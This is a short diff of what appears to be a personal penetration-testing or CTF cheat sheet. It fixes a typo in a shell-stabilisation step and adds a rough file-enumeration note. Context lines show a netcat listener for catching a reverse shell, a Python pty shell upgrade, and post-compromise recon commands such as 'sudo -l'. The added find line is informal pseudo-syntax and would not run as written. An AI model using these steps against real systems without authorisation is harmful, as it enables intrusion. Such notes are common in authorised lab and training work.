@@ -138,9 +138,10 @@ nc -nvlp 5555
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 #also what else?
-xport TERM=xterm-256color
+export TERM=xterm-256color
 
 #and something more i am sure?
+
 
 ########################################
 # 6. FILE TRANSFER
@@ -163,4 +164,6 @@ uname -a
 pwd
 ls -la
 ps aux
+
+find / -type f OR -name *.whatever or -group www-data (based on id group membership) and then 2>/dev/null
 sudo -l
